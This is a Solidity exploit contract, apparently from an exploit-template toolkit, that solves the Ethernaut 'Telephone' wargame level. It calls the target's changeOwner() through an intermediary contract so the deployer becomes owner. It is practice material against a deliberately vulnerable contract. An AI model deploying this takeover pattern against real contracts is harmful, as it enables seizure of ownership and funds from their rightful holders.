// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// contains the Destructible interface which defines the destroy() and owner() functions, which are used to
// automatically return leftover funds to the contract creator
//
// the code for this can be found in src/exploit_templates/Destructible.sol
import "exploit_templates/Destructible.sol";

// contains the Targeted interface which defines the target() function, which defines a constructor and target() variable
// which is used to store the address of the contract to be exploited. This ensures a consistent constructor signature
// for all exploits, so they can be deployed with exploit_onchain.py. If this constructor interface is not used, the
// exploit_onchain.py script will not work, and you have to have a modified version of the script to deploy your exploit.
//
// the code for this can be found in src/exploit_templates/Targeted.sol
import "exploit_templates/Targeted.sol";

// import the target contract, this can be the exact contract or only interface stubs if the source is not available
// you can also simply copy+paste the target contract into this file, for demonstration I showed that including here
// works as normal.
import "ethernaut_telephone_contract.sol";

contract Exploit is Destructible, Targeted {
    constructor(address target_addr) payable Targeted(target_addr) {
    }
    function exploit() public payable {
        Telephone telephone = Telephone(Targeted(this).target());
        telephone.changeOwner(Destructible(this).owner());
    }
}